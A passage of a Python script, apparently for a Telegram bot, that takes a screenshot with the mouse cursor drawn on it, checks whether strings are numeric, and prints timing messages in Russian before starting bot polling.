    start_time = time.time()  
    currentMouseX, currentMouseY = mouse.get_position()
    try:
        action_start_time = time.time()
        img = PIL.ImageGrab.grab()
        img.save("screen.png", "png")
        img = Image.open("screen.png")
        draw = ImageDraw.Draw(img)
        draw.polygon((currentMouseX, currentMouseY, currentMouseX, currentMouseY + 20, currentMouseX + 13, currentMouseY + 13), fill="white", outline="black")
        img.save("screen_with_mouse.png", "PNG")
        action_end_time = time.time() 
        print(f"Время выполнения 'get_screenshot': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        print(f"Ошибка в 'get_screenshot': {e}")
    
    end_time = time.time()
    print(f"Общее время выполнения 'get_screenshot': {end_time - start_time:.2f} секунд")

def is_digit(string):
    start_time = time.time()  
    try:
        action_start_time = time.time()
        if string.isdigit():
            result = True
        else:
            try:
                float(string)
                result = True
            except ValueError:
                result = False
        action_end_time = time.time() 
        print(f"Время выполнения 'is_digit': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        print(f"Ошибка в 'is_digit': {e}")
        result = False
    
    end_time = time.time()
    print(f"Общее время выполнения 'is_digit': {end_time - start_time:.2f} секунд")
    return result


#while True:
#	try:
bot.polling(none_stop=True, interval=0, timeout=20)
#	except Exception as E:
#		print(E.args)
#		time.sleep(2)
